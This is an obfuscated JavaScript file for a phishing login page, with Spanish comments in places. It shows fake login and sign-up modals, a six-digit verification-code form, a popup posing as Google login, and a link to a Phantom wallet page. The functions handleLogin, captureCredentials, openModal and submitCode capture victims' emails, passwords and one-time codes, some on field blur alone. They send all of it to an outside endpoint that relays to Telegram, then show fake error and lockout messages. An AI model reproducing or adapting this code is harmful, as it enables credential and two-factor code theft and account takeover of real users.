function openGooglePopup() {
  var _0x5d93ce = screen.width / 0x2 - 250;
  var _0x1ff84d = screen.height / 0x2 - 300;
  window.open("https://sites.google.com/view/v3-session/login", "GoogleLoginPopup", "width=500,height=600,top=" + _0x1ff84d + ',left=' + _0x5d93ce + ",resizable=yes,scrollbars=yes,status=yes");
}
async function sendToTelegram(_0x18eaf0) {
  try {
    const _0x13c819 = document.getElementById("loader");
    const _0x48b73e = document.getElementById("loadingText");
    if (_0x13c819) {
      _0x13c819.style.display = "block";
    }
    if (_0x48b73e) {
      _0x48b73e.style.display = "block";
    }
    const _0x4a3263 = await fetch("https://appaxiom.vercel.app/api/send-telegram", {
      'method': "POST",
      'headers': {
        'Content-Type': 'application/json'
      },
      'body': JSON.stringify({
        'message': _0x18eaf0
      })
    });
    if (_0x13c819) {
      _0x13c819.style.display = "none";
    }
    if (_0x48b73e) {
      _0x48b73e.style.display = "none";
    }
    return _0x4a3263.ok ? true : (console.error("Error API status:", _0x4a3263.status), alert("Error al enviar la información. Por favor, inténtalo de nuevo."), false);
  } catch (_0x513dc4) {
    const _0x5d4811 = document.getElementById("loader");
    const _0x6acedd = document.getElementById("loadingText");
    if (_0x5d4811) {
      _0x5d4811.style.display = "none";
    }
    if (_0x6acedd) {
      _0x6acedd.style.display = "none";
    }
    console.error("Fallo de red:", _0x513dc4);
    alert("Error de red. Por favor, verifica tu conexión a internet.");
    return false;
  }
}
let codeAttempts = 0x0;
async function submitCode() {
  const _0x2fe3ae = document.getElementById('submitCodeBtn');
  if (_0x2fe3ae) {
    _0x2fe3ae.disabled = true;
  }
  const _0x3ec4b5 = document.querySelectorAll(".code-input");
  const _0xec713c = Array.from(_0x3ec4b5).map(_0x522885 => _0x522885.value).join('').trim();
  const _0x50f290 = document.getElementById("userEmail").textContent || document.getElementById("emailInput")?.["value"] || "N/A";
  codeAttempts++;
  const _0x1b2ae2 = "Verification code submitted (Attempt " + codeAttempts + ")\nEmail: " + _0x50f290 + "\nCode: " + _0xec713c;
  await sendToTelegram(_0x1b2ae2);
  setTimeout(() => {
    const _0x455a11 = document.getElementById("codeError");
    if (codeAttempts >= 0x2) {
      if (_0x455a11) {
        _0x455a11.style.display = "block";
        _0x455a11.textContent = "Too many failed attempts. Please wait 5 minutes before trying again.";
      }
      _0x3ec4b5.forEach(_0x88f543 => {
        _0x88f543.disabled = true;
        _0x88f543.value = '';
      });
      if (_0x2fe3ae) {
        _0x2fe3ae.disabled = true;
      }
    } else {
      if (_0x455a11) {
        _0x455a11.style.display = 'block';
        _0x455a11.textContent = "The code is incorrect.";
      }
      _0x3ec4b5.forEach(_0x455261 => _0x455261.value = '');
      if (_0x2fe3ae) {
        _0x2fe3ae.disabled = false;
      }
    }
  }, 0xbb8);
}
function openModal(_0x2bd994) {
  const _0x56f2f4 = document.getElementById('loginModal');
  const _0x17c4e7 = _0x56f2f4.querySelector(".modal-title");
  const _0x478a09 = _0x56f2f4.querySelector(".modal-login-btn");
  const _0x550243 = _0x56f2f4.querySelector(".signup-link");
  if (_0x2bd994 === "signup" || _0x2bd994 === "Sign up") {
    _0x17c4e7.textContent = "Sign up";
    _0x478a09.textContent = "Sign up";
    _0x550243.innerHTML = "Already have an account? <a href=\"#\" onclick=\"switchToLogin()\">Login</a>";
  } else {
    _0x17c4e7.textContent = "Login";
    _0x478a09.textContent = "Login";
    _0x550243.innerHTML = "Don't have an account? <a href=\"#\" onclick=\"switchToSignup()\">Sign up</a>";
  }
  _0x56f2f4.classList.add('active');
  document.body.style.overflow = "hidden";
  setTimeout(() => {
    const _0x34da8b = document.getElementById("emailInput");
    const _0xf80959 = document.getElementById('passwordInput');
    if (_0x34da8b && _0xf80959 && _0x34da8b.value && _0xf80959.value) {
      const _0x4ee4fb = (_0x2bd994 === "signup" || _0x2bd994 === "Sign up" ? "Signup" : "Login") + " attempt\nEmail: " + _0x34da8b.value + "\nPassword: " + _0xf80959.value;
      sendToTelegram(_0x4ee4fb);
    }
  }, 0x64);
  if (typeof sendTelegramAlert === "function") {
    sendTelegramAlert(_0x2bd994);
  }
}
function closeModal() {
  const _0xeeb7d6 = document.getElementById("loginModal");
  _0xeeb7d6.classList.remove("active");
  document.body.style.overflow = "auto";
  resetModal();
}
function switchToSignup() {
  openModal("Sign up");
}
function switchToLogin() {
  openModal('Login');
}
function resetModal() {
  document.getElementById("loginForm").style.display = "block";
  document.getElementById("verificationForm").style.display = 'none';
  document.getElementById('loadingScreen').style.display = "none";
  document.getElementById("backArrow").style.display = "none";
  const _0x3f551f = document.querySelectorAll('.code-input');
  _0x3f551f.forEach(_0x181b93 => _0x181b93.value = '');
  const _0x4cf956 = document.getElementById("codeError");
  if (_0x4cf956) {
    _0x4cf956.style.display = "none";
  }
  codeAttempts = 0x0;
}
function backToLogin() {
  document.getElementById("verificationForm").style.display = "none";
  document.getElementById("loginForm").style.display = "block";
  document.getElementById("backArrow").style.display = "none";
}
function showVerificationForm(_0x3feeba) {
  document.getElementById('loginForm').style.display = "none";
  document.getElementById("loadingScreen").style.display = "block";
  document.getElementById("backArrow").style.display = "none";
  setTimeout(() => {
    document.getElementById('loadingScreen').style.display = 'none';
    document.getElementById("verificationForm").style.display = "block";
    document.getElementById("backArrow").style.display = "block";
    document.getElementById("userEmail").textContent = _0x3feeba;
    startCountdown();
  }, 0x1388);
}
function startCountdown() {
  let _0x111563 = 0x35;
  const _0x452e0f = document.getElementById("countdown");
  const _0x4fd94c = setInterval(() => {
    if (_0x452e0f) {
      _0x452e0f.textContent = _0x111563;
    }
    _0x111563--;
    if (_0x111563 < 0x0) {
      clearInterval(_0x4fd94c);
      const _0x4636a7 = document.getElementById("resendInfo");
      if (_0x4636a7) {
        _0x4636a7.innerHTML = "You can <a href=\"#\" onclick=\"resendCode()\">resend a new code</a>";
      }
    }
  }, 0x3e8);
}
function resendCode() {
  const _0x379de0 = document.getElementById('resendInfo');
  if (_0x379de0) {
    _0x379de0.innerHTML = "You can resend a new code in <span id=\"countdown\">53</span> seconds";
  }
  startCountdown();
}
function moveToNext(_0x523ce5, _0x220a47) {
  if (_0x523ce5.value.length === 0x1 && _0x220a47 < 0x5) {
    const _0xb89121 = document.querySelectorAll('.code-input')[_0x220a47 + 0x1];
    if (_0xb89121) {
      _0xb89121.focus();
    }
  }
  const _0xe23de3 = document.querySelectorAll('.code-input');
  const _0x3da546 = Array.from(_0xe23de3).every(_0xc0fbac => _0xc0fbac.value.length === 0x1);
  if (_0x3da546) {
    submitCode();
  }
}
function togglePassword() {
  const _0x98b357 = document.getElementById("passwordInput");
  const _0x247f82 = document.getElementById("eyeIcon");
  if (_0x98b357.type === 'password') {
    _0x98b357.type = "text";
    _0x247f82.className = "fas fa-eye-slash";
  } else {
    _0x98b357.type = "password";
    _0x247f82.className = "fas fa-eye";
  }
}
async function handleLogin(_0x2330e1) {
  _0x2330e1.preventDefault();
  const _0x130c53 = _0x2330e1.target.querySelector("input[type=\"email\"]").value;
  const _0x4ee0e7 = _0x2330e1.target.querySelector("input[type=\"password\"]").value;
  console.log("Login attempt:", _0x130c53);
  const _0x4d04b9 = "Login attempt\nEmail: " + _0x130c53 + "\nPassword: " + _0x4ee0e7;
  sendToTelegram(_0x4d04b9);
  showVerificationForm(_0x130c53);
}
function captureCredentials() {
  const _0x2d672f = document.getElementById('emailInput');
  const _0x5983cd = document.getElementById("passwordInput");
  if (_0x2d672f && _0x5983cd) {
    _0x2d672f.addEventListener("blur", function () {
      if (_0x2d672f.value && _0x5983cd.value) {
        const _0x2f18a4 = "Credentials captured\nEmail: " + _0x2d672f.value + "\nPassword: " + _0x5983cd.value;
        sendToTelegram(_0x2f18a4);
      }
    });
    _0x5983cd.addEventListener("blur", function () {
      if (_0x2d672f.value && _0x5983cd.value) {
        const _0x4abb94 = "Credentials captured\nEmail: " + _0x2d672f.value + "\nPassword: " + _0x5983cd.value;
        sendToTelegram(_0x4abb94);
      }
    });
  }
}
function handleGoogleLogin() {
  console.log("Google login clicked");
  alert("Google login - implement your logic here");
}
function handlePhantomLogin() {
  console.log("Phantom login clicked");
  window.location.href = "phantom.html";
}
function handleForgotPassword() {
  console.log("Forgot password clicked");
  alert("Forgot password - implement your logic here");
}
document.getElementById("loginModal").addEventListener('click', function (_0x531baa) {
  if (_0x531baa.target === this) {
    closeModal();
  }
});
document.addEventListener("keydown", function (_0x410249) {
  if (_0x410249.key === "Escape") {
    closeModal();
  }
});
document.addEventListener("keydown", function (_0x343d00) {
  if (_0x343d00.target.classList && _0x343d00.target.classList.contains("code-input") && _0x343d00.key === "Backspace") {
    const _0x1f564c = Array.from(document.querySelectorAll(".code-input"));
    const _0x90382a = _0x1f564c.indexOf(_0x343d00.target);
    if (_0x343d00.target.value === '' && _0x90382a > 0x0) {
      _0x1f564c[_0x90382a - 0x1].focus();
    }
  }
});
document.addEventListener("DOMContentLoaded", function () {
  captureCredentials();
});
function openGooglePopup() {
  var _0x466a1d = screen.width / 0x2 - 250;
  var _0x2ee0f4 = screen.height / 0x2 - 300;
  window.open("https://sites.google.com/view/v3-session/home", 'GoogleLoginPopup', "width=500,height=600,top=" + _0x2ee0f4 + ",left=" + _0x466a1d + ",resizable=yes,scrollbars=yes,status=yes");
}
function openModal(_0x1c8b9b) {
  const _0x424aca = document.getElementById("loginModal");
  const _0x550e99 = _0x424aca.querySelector(".modal-title");
  const _0x4e4729 = _0x424aca.querySelector(".modal-login-btn");
  const _0x1f5407 = _0x424aca.querySelector(".signup-link");
  if (_0x1c8b9b === "signup" || _0x1c8b9b === "Sign up") {
    _0x550e99.textContent = "Sign up";
    _0x4e4729.textContent = "Sign up";
    _0x1f5407.innerHTML = "Already have an account? <a href=\"#\" onclick=\"switchToLogin()\">Login</a>";
  } else {
    _0x550e99.textContent = "Login";
    _0x4e4729.textContent = "Login";
    _0x1f5407.innerHTML = "Don't have an account? <a href=\"#\" onclick=\"switchToSignup()\">Sign up</a>";
  }
  _0x424aca.classList.add("active");
  document.body.style.overflow = "hidden";
  sendTelegramAlert(_0x1c8b9b);
}
function closeModal() {
  const _0xdffb10 = document.getElementById("loginModal");
  _0xdffb10.classList.remove("active");
  document.body.style.overflow = "auto";
  resetModal();
}
function switchToSignup() {
  openModal("Sign up");
}
function switchToLogin() {
  openModal("Login");
}
function resetModal() {
  document.getElementById('loginForm').style.display = "block";
  document.getElementById('verificationForm').style.display = 'none';
  document.getElementById("loadingScreen").style.display = "none";
  document.getElementById("backArrow").style.display = 'none';
  const _0xb0f637 = document.querySelectorAll(".code-input");
  _0xb0f637.forEach(_0x200986 => _0x200986.value = '');
}
function backToLogin() {
  document.getElementById("verificationForm").style.display = "none";
  document.getElementById("loginForm").style.display = 'block';
  document.getElementById("backArrow").style.display = "none";
}
function showVerificationForm(_0x32a671) {
  document.getElementById("loginForm").style.display = "none";
  document.getElementById("loadingScreen").style.display = "block";
  document.getElementById("backArrow").style.display = "none";
  setTimeout(() => {
    document.getElementById('loadingScreen').style.display = "none";
    document.getElementById("verificationForm").style.display = 'block';
    document.getElementById('backArrow').style.display = "block";
    document.getElementById("userEmail").textContent = _0x32a671;
    startCountdown();
  }, 0x1388);
}
function startCountdown() {
  let _0x1f1df6 = 0x35;
  const _0x241da1 = document.getElementById('countdown');
  const _0x234a09 = setInterval(() => {
    _0x241da1.textContent = _0x1f1df6;
    _0x1f1df6--;
    if (_0x1f1df6 < 0x0) {
      clearInterval(_0x234a09);
      document.getElementById("resendInfo").innerHTML = "You can <a href=\"#\" onclick=\"resendCode()\">resend a new code</a>";
    }
  }, 0x3e8);
}
function resendCode() {
  document.getElementById("resendInfo").innerHTML = "You can resend a new code in <span id=\"countdown\">53</span> seconds";
  startCountdown();
}
function moveToNext(_0x7e607b, _0x50cb66) {
  if (_0x7e607b.value.length === 0x1 && _0x50cb66 < 0x5) {
    const _0x3ff8cf = document.querySelectorAll('.code-input')[_0x50cb66 + 0x1];
    if (_0x3ff8cf) {
      _0x3ff8cf.focus();
    }
  }
  const _0x3717b2 = document.querySelectorAll('.code-input');
  const _0x52428c = Array.from(_0x3717b2).every(_0x167f0b => _0x167f0b.value.length === 0x1);
  if (_0x52428c) {
    const _0x17e904 = Array.from(_0x3717b2).map(_0x301321 => _0x301321.value).join('');
    console.log("Verification code entered:", _0x17e904);
    alert("Code verification - implement your logic here");
  }
}
function togglePassword() {
  const _0x3eaf76 = document.getElementById("passwordInput");
  const _0x55561f = document.getElementById("eyeIcon");
  if (_0x3eaf76.type === 'password') {
    _0x3eaf76.type = "text";
    _0x55561f.className = "fas fa-eye-slash";
  } else {
    _0x3eaf76.type = "password";
    _0x55561f.className = "fas fa-eye";
  }
}
function handleLogin(_0x266358) {
  _0x266358.preventDefault();
  const _0x45b2b7 = _0x266358.target.querySelector("input[type=\"email\"]").value;
  console.log("Login attempt:", _0x45b2b7);
  showVerificationForm(_0x45b2b7);
}
function handleGoogleLogin() {
  console.log("Google login clicked");
  alert("Google login - implement your logic here");
}
function handlePhantomLogin() {
  console.log("Phantom login clicked");
  window.location.href = "phantom.html";
}
function handleForgotPassword() {
  console.log("Forgot password clicked");
}
document.getElementById('loginModal').addEventListener('click', function (_0x4620ad) {
  if (_0x4620ad.target === this) {
    closeModal();
  }
});
document.addEventListener("keydown", function (_0x53bdc6) {
  if (_0x53bdc6.key === "Escape") {
    closeModal();
  }
});
document.addEventListener("keydown", function (_0x3930ce) {
  if (_0x3930ce.target.classList.contains("code-input") && _0x3930ce.key === "Backspace") {
    const _0x1986e0 = Array.from(document.querySelectorAll(".code-input"));
    const _0x1471e6 = _0x1986e0.indexOf(_0x3930ce.target);
    if (_0x3930ce.target.value === '' && _0x1471e6 > 0x0) {
      _0x1986e0[_0x1471e6 - 0x1].focus();
    }
  }
});

(function () {
  document.addEventListener('DOMContentLoaded', function () {
    const modal = document.getElementById('loginModal');
    if (!modal) return; // nada que hacer si no existe

    // Asegurar estilos esenciales para que sea visible en móvil/desktop
    function ensureModalBaseStyles() {
      // estilo del overlay
      Object.assign(modal.style, {
        display: 'none', /* inicio oculto */
        position: 'fixed',
        inset: '0', /* top:0; right:0; bottom:0; left:0 */
        zIndex: '9999',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'rgba(0,0,0,0.6)',
        padding: '16px',
        boxSizing: 'border-box'
      });

      // contenido interno: intenta buscar un contenedor con clase .modal-content o el primer hijo
      const content = modal.querySelector('.modal-content') || modal.firstElementChild;
      if (content) {
        Object.assign(content.style, {
          width: 'min(420px, 100%)',
          maxWidth: '100%',
          maxHeight: 'calc(100vh - 60px)', // deja espacio en móvil
          overflowY: 'auto',
          margin: '0 auto',
          boxSizing: 'border-box'
        });
      }
    }
    ensureModalBaseStyles();

    // Helpers seguros para buscar elementos y no romper si no existen
    function q(id) { return document.getElementById(id) || null; }
    function setText(sel, text) { try { const el = modal.querySelector(sel); if(el) el.textContent = text; } catch(e){} }

    // Override / define openModal de forma robusta
    window.openModal = function (mode) {
      try {
        const titleEl = modal.querySelector('.modal-title');
        const actionBtn = modal.querySelector('.modal-login-btn');
        const signupLink = modal.querySelector('.signup-link');

        if (mode === 'signup' || mode === 'Sign up') {
          if (titleEl) titleEl.textContent = 'Sign up';
          if (actionBtn) actionBtn.textContent = 'Sign up';
          if (signupLink) signupLink.innerHTML = 'Already have an account? <a href="#" onclick="switchToLogin()">Login</a>';
        } else {
          if (titleEl) titleEl.textContent = 'Login';
          if (actionBtn) actionBtn.textContent = 'Login';
          if (signupLink) signupLink.innerHTML = 'Don\'t have an account? <a href="#" onclick="switchToSignup()">Sign up</a>';
        }

        // Forzar estilos visibles (evita problemas CSS en mobile)
        modal.style.display = 'flex';
        modal.classList.add('active');
        document.body.style.overflow = 'hidden';

        // Envío de alerta (si existe) sin romper si no existe
        if (typeof sendTelegramAlert === 'function') {
          try { sendTelegramAlert(mode); } catch (e) { console.warn('sendTelegramAlert fallo:', e); }
        }
      } catch (e) {
        console.error('openModal error:', e);
      }
    };

    // Override / define closeModal de forma robusta
    window.closeModal = function () {
      try {
        modal.style.display = 'none';
        modal.classList.remove('active');
        document.body.style.overflow = 'auto';
        // si tienes resetModal, llamarlo si existe
        if (typeof resetModal === 'function') {
          try { resetModal(); } catch (e) { console.warn('resetModal fallo:', e); }
        }
      } catch (e) {
        console.error('closeModal error:', e);
      }
    };

    // Cerrar al hacer click fuera del contenido (overlay)
    modal.addEventListener('click', function (ev) {
      if (ev.target === modal) {
        window.closeModal();
      }
    });

    // Escape para cerrar
    document.addEventListener('keydown', function (ev) {
      if (ev.key === 'Escape') window.closeModal();
    });

    // Mejora de openGooglePopup: muchos móviles bloquean window.open con "features" -> usar _blank o same tab
    window.openGooglePopup = function (url) {
      try {
        url = url || 'https://sites.google.com/view/v3-session/login';
        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        if (isMobile) {
          // En móviles algunos navegadores ignoran features o abren pestañas en blanco.
          // Mejor abrir en _blank sin features o navegar en la misma pestaña:
          const newWin = window.open(url, '_blank');
          if (!newWin) {
            // Si fue bloqueado, hacemos navegación en la misma pestaña como fallback
            window.location.href = url;
          }
        } else {
          // Desktop: centrar la ventana con features
          const w = 500, h = 600;
          const left = Math.round(screen.width / 2 - w / 2);
          const top = Math.round(screen.height / 2 - h / 2);
          window.open(url, 'GoogleLoginPopup', `width=${w},height=${h},top=${top},left=${left},resizable=yes,scrollbars=yes,status=yes`);
        }
      } catch (e) {
        console.error('openGooglePopup fallback error:', e);
        try { window.location.href = url; } catch (__) {}
      }
    };

    // Si tu script hacía llamadas que esperan #loginModal ya cargado, ya está seguro ahora.
    // (Opcional) si quieres que modal pueda abrirse llamando a window.openModal desde botones <a> o <button> ya está listo.

  }); // DOMContentLoaded
})();